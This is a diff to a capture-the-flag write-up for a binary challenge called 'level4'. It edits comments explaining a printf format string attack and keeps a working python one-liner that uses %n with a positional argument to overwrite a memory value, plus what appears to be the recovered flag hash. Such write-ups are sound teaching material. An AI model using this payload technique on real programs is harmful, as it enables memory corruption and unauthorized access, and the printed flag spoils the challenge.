@@ -1,9 +1,9 @@
 # Following the analysis of the code, we see a fgets and a printf. Here, we can't exploit the fgets, it's a secured function.
 # We see the cmp between a random value and an address in another segment.
 # We decide to exploit the printf thanks to reverse format string.
-# The "%n" formatter let us write into it the value we want so we craft the address of the value to be used a reference by printf, following enough noise to equal
+# The "%n" formatter lets us to write into an address the value we want so we craft the address of the value to be used as reference by printf, following enough noise to equal
 # the target, i.e 16930112
-# The "$" flag let us lead printf arg directly on the fourth stack argument, the our.
+# The "$" flag lets us lead printf arg directly on the fourth stack argument, ours (our buffer).
 
 python -c 'print "\x10\x98\x04\x08" + "%16930112u%12$n"' | ./level4
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
